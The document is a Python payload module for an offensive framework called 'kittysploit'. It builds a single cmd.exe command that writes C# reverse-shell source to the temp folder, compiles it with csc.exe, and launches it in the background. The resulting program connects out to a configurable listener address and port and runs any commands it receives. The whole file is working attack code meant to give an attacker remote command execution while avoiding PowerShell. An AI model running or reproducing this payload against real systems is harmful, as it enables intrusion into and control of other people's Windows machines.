from kittysploit import *


class Module(Payload):

	CLIENT_LANGUAGE = "cmd"

	__info__ = {
		"name": "Windows CMD Reverse TCP (csc on-box)",
		"description": (
			"Pure cmd.exe one-liner: writes a tiny C# reverse shell, compiles with csc.exe "
			"(.NET Framework), and runs it — no powershell.exe"
		),
		"category": PayloadCategory.CMD,
		"arch": Arch.OTHER,
		"platform": Platform.WINDOWS,
		"listener": "listeners/multi/reverse_tcp",
		"handler": Handler.REVERSE,
		"session_type": SessionType.SHELL,
	}

	lhost = OptString("127.0.0.1", "Connect to IP address", True)
	lport = OptPort(4444, "Connect to port", True)

	def generate(self):
		host = str(self.lhost)
		port = int(self.lport)

		# Single-line C# keeps echo escaping simple.
		cs = (
			"using System;using System.Diagnostics;using System.IO;using System.Net.Sockets;"
			"class K{static void Main(){try{var c=new TcpClient(\"" + host + "\"," + str(port) + ");"
			"var s=c.GetStream();var r=new StreamReader(s);var w=new StreamWriter(s){AutoFlush=true};"
			"w.WriteLine(\"KittySploit CMD/csc shell\");"
			"for(;;){var cmd=r.ReadLine();if(cmd==null)break;cmd=cmd.Trim();if(cmd.Length==0)continue;"
			"if(cmd==\"exit\"||cmd==\"quit\")break;"
			"var p=new ProcessStartInfo(\"cmd.exe\",\"/c \"+cmd);"
			"p.RedirectStandardOutput=true;p.RedirectStandardError=true;p.UseShellExecute=false;p.CreateNoWindow=true;"
			"var x=Process.Start(p);var o=x.StandardOutput.ReadToEnd()+x.StandardError.ReadToEnd();x.WaitForExit();"
			"if(o.Length==0)o=\"[exit \"+x.ExitCode+\"]\\n\";w.Write(o);}}catch{}}}"
		)

		# Escape for cmd echo: caret-escape specials that break parsing.
		cs_echo = (
			cs.replace("^", "^^")
			.replace("&", "^&")
			.replace("|", "^|")
			.replace("<", "^<")
			.replace(">", "^>")
			.replace("(", "^(")
			.replace(")", "^)")
			.replace("%", "%%")
		)

		csc64 = r"%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
		csc32 = r"%WINDIR%\Microsoft.NET\Framework\v4.0.30319\csc.exe"
		src = r"%TEMP%\ks_rev.cs"
		exe = r"%TEMP%\ks_rev.exe"

		return (
			'cmd.exe /c "'
			f'echo {cs_echo}>{src} & '
			f'(if exist {csc64} ({csc64} /nologo /t:exe /out:{exe} {src})) & '
			f'(if not exist {exe} if exist {csc32} ({csc32} /nologo /t:exe /out:{exe} {src})) & '
			f'(if exist {exe} (start "" /b {exe}) else (echo [!] csc.exe missing or compile failed))'
			'"'
		)
